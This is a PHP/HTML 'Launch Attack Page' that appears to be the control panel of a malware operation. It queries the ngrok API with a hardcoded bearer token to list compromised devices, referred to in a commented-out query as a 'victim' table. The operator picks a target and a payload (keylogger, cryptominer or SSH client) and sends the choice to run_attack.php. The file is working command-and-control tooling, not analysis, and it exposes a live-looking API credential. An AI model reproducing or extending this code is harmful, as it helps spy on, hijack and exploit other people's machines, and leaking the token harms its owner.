<html>
<head>
    <title>Launch Attack Page</title>
    <script src="http://code.jquery.com/jquery-1.9.0.min.js"></script>
</head>
<body>
<div class="form">
    <h2>Select Options</h2>
    <form action="run_attack.php" method="post">

<?php
require 'updateIP.php';
//gets the Ip for a session
$url = "https://api.ngrok.com/tunnels";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Authorization: Bearer 2Bsvp9toxwuGHwk3lkyNJYZRugE_27CncnazyBQBXs7LacBAz",
    "Ngrok-Version: 2",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);


$resp = curl_exec($curl);
curl_close($curl);

$data = json_decode($resp, true);

//gets the Metadata (user name strored)
$url = "https://api.ngrok.com/tunnel_sessions";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Authorization: Bearer 2Bsvp9toxwuGHwk3lkyNJYZRugE_27CncnazyBQBXs7LacBAz",
    "Ngrok-Version: 2",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$resp = curl_exec($curl);

$dataTwo = json_decode($resp, true);
echo "<select id='select_ip' name='ip_add'>";
echo "<option value='' selected='selected'>Choose Device</option>";

//checks database
/*
$sql = "SELECT UserName, CurrentIP FROM victim";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    echo "found rez";
    // output data of each row
    while($row = $result->fetch_assoc()) {
        //shows all connections that have been added to the MYSQL database
        echo "<option value='".$row['UserName']."'>".$row['UserName'].",".$row['CurrentIP']."</option>";
    }
}else{
    echo "0 reuslts";
}
*/

//SHOWS LIVE CONNECTIONS
foreach ($data['tunnels'] as $tunnel){
    //echo $tunnel['tunnel_session']['id']; //id for tunnel session
    foreach ($dataTwo['tunnel_sessions'] as $session){
        if ($session['id'] == $tunnel['tunnel_session']['id']){
            echo "<option value='".$tunnel['public_url']."'>".$session['metadata'].", ".$tunnel['public_url']."</option>"; //gets the metadata that goes with the url


        }
    }
}

echo "</select>";

?>
        <select id="select_attack" name="attack">
            <option value="" selected="selected">Choose attack</option>
            <option value="keylog">Keylogger</option>
            <option value="crypto">CryptoMiner</option>
            <option value="SSH">SSH Client</option>
        </select>
        <button type="submit">Submit</button>
        <form/>
</html>
